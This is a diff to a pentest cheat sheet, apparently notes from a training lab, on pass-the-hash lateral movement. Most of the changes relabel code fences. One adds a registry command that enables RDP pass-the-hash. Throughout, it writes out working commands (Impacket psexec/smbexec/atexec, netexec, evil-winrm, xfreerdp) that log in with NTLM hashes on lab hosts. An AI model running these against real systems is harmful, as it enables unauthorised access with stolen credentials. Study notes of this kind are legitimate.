@@ -44,7 +44,7 @@ Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F1
 
 ### Pass the Hash with Impacket (Linux)
 
-```bash
+```shell
 /usr/share/doc/python3-impacket/examples/psexec.py    administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 /usr/share/doc/python3-impacket/examples/smbexec.py   administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 /usr/share/doc/python3-impacket/examples/atexec.py    administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
@@ -52,7 +52,7 @@ Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F1
 ```
 
 ### Pass the Hash with CrackMapExec or netexec (Linux)
-```bash
+```shell
 ## we can add --local-auth 
 netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
@@ -61,11 +61,15 @@ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF
 
 ### Pass the Hash with evil-winrm (Linux)
 
-```bash
+```shell
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 ### Pass the Hash with RDP (Linux)
+**Adding the DisableRestrictedAdmin Registry Key**
+```shell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
 
 ```bash
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
